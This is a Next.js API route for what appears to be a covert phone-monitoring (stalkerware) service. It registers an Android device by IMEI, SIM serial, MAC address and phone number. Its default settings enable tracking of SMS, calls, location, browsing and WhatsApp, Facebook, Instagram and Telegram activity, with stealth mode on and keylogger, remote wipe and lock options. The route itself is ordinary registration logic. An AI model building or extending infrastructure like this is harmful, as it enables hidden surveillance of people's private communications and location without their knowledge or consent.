import { NextResponse } from "next/server"
import { createAdminConfig, sendError } from "@/lib/utils/api-helpers"
import { v4 as uuidv4 } from "uuid"

const DEFAULT_SETTINGS = {
  track_sms: true,
  track_calls: true,
  track_locations: true,
  track_photos: false,
  track_videos: false,
  track_browser: true,
  track_social: true,
  track_keylogger: false,
  location_interval: 15,
  sync_over_wifi_only: false,
  capture_app_usage: true,
  stealth_mode: true,
  wipe_data_flag: false,
  lock_device_flag: false,
  alarm_flag: false,
  geofence_zones: [],
  blocked_apps: [],
  blocked_websites: [],
  social_platforms: ["whatsapp", "facebook", "instagram", "telegram"],
  schedule_restriction: {}
}

export async function POST(req: Request) {
  try {
    const body = await req.json()
    const { 
      email, password, device_name, device_model, 
      android_version, imei, phone_number, sim_operator, 
      sim_serial, mac_address, app_version, is_rooted 
    } = body

    // 1. Validate required fields
    if (!email || !password || !device_name || !imei) {
      return sendError("Missing required fields. 'email', 'password', 'device_name', and 'imei' are required.")
    }

    const supabaseAdmin = createAdminConfig()

    // 2. Authenticate user to verify credentials
    // We use the regular auth endpoint with the admin client to verify
    const { data: authData, error: authError } = await supabaseAdmin.auth.signInWithPassword({
      email,
      password,
    })

    if (authError || !authData.user) {
      return sendError("Invalid credentials", 401)
    }

    const userId = authData.user.id

    // 3. Generate new device token
    const deviceToken = uuidv4()

    // 4. Check if device with IMEI already exists for this user
    const { data: existingDevice } = await supabaseAdmin
      .from("devices")
      .select("id")
      .eq("user_id", userId)
      .eq("imei", imei)
      .maybeSingle()

    let deviceId: string
    let currentSettings = { ...DEFAULT_SETTINGS }

    if (existingDevice) {
      // Setup payload for update
      deviceId = existingDevice.id
      const { error: updateError } = await supabaseAdmin
        .from("devices")
        .update({
          device_name,
          device_model,
          android_version,
          phone_number,
          sim_operator,
          sim_serial,
          mac_address,
          app_version,
          is_rooted,
          device_token: deviceToken,
          is_online: true,
          last_seen: new Date().toISOString()
        })
        .eq("id", deviceId)

      if (updateError) {
        console.error("Device update error", updateError)
        return sendError("Failed to update existing device record", 500)
      }

      // We maintain existing settings if possible instead of overwriting defaults 
      // but fetch them to return to the app
      const { data: devSet } = await supabaseAdmin
        .from("device_settings")
        .select("*")
        .eq("device_id", deviceId)
        .single()
      
      if (devSet) {
        currentSettings = devSet
      } else {
        // Highly unlikely unless partial record created previously without settings
        await supabaseAdmin.from("device_settings").insert({
          device_id: deviceId,
          ...DEFAULT_SETTINGS
        })
      }

    } else {
      // 5. Insert new device row
      const { data: newDevice, error: insertError } = await supabaseAdmin
        .from("devices")
        .insert({
          user_id: userId,
          device_name,
          device_model,
          android_version,
          imei,
          phone_number,
          sim_operator,
          sim_serial,
          mac_address,
          app_version,
          is_rooted: is_rooted ?? false,
          device_token: deviceToken,
          is_online: true,
          last_seen: new Date().toISOString()
        })
        .select("id")
        .single()

      if (insertError || !newDevice) {
        console.error("Device insert error:", insertError)
        return sendError("Failed to register new device", 500)
      }

      deviceId = newDevice.id

      // 6. Insert default settings
      const { error: settingsError } = await supabaseAdmin
        .from("device_settings")
        .insert({
          device_id: deviceId,
          ...DEFAULT_SETTINGS
        })

      if (settingsError) {
        console.error("Device settings insert error:", settingsError)
        // Ensure device still returns even if settings failed to init 
        // to prevent bricking onboarding
      }
    }

    // 7. Return success response
    return NextResponse.json({
      success: true,
      device_id: deviceId,
      device_token: deviceToken,
      user_id: userId,
      is_new_device: !existingDevice,
      settings: currentSettings
    }, { status: 200 })

  } catch (error: any) {
    console.error("Device registration unhandled error:", error)
    return sendError("Internal server error during registration", 500)
  }
}
